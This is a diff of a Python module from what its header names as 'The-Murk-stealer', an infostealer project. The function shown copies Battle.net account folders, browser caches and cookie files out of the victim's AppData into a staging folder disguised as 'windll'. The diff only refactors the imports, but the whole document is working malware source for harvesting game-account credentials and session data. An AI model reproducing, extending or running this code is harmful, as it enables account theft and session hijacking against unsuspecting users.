@@ -10,12 +10,13 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-import os
-import shutil
+from os import sep,environ,makedirs,path
+from shutil import copytree, copy2
+
 
 def BattleNet(data):
-    pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-    if os.path.exists(f"{pathtofolder}\Battle.net\Account"):
+    pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
+    if path.exists(f"{pathtofolder}\Battle.net\Account"):
         
         folders= [
             r'\Battle.net\Account',
@@ -27,15 +28,15 @@ def BattleNet(data):
             r'\Battle.net\BrowserCaches\LocalPrefs.json',
             r'\Battle.net\BrowserCaches\common\Cookies'
         ]
-        os.makedirs(rf"{pathtofolder}\windll\Games\Battle.net")
+        makedirs(rf"{pathtofolder}\windll\Games\Battle.net")
         for folder in folders:
             try:
-                shutil.copytree(f"{pathtofolder}{folder}",f"{pathtofolder}\windll\Games{folder}")
+                copytree(f"{pathtofolder}{folder}",f"{pathtofolder}\windll\Games{folder}")
             except Exception as e:
                 print(e)
         for file in files:
             try:
-                shutil.copy2(f"{pathtofolder}{file}",f"{pathtofolder}\windll\Games{file}")
+                copy2(f"{pathtofolder}{file}",f"{pathtofolder}\windll\Games{file}")
             except Exception as e:
                 print(e)
         data.append("\n∟🎮Battle.net")
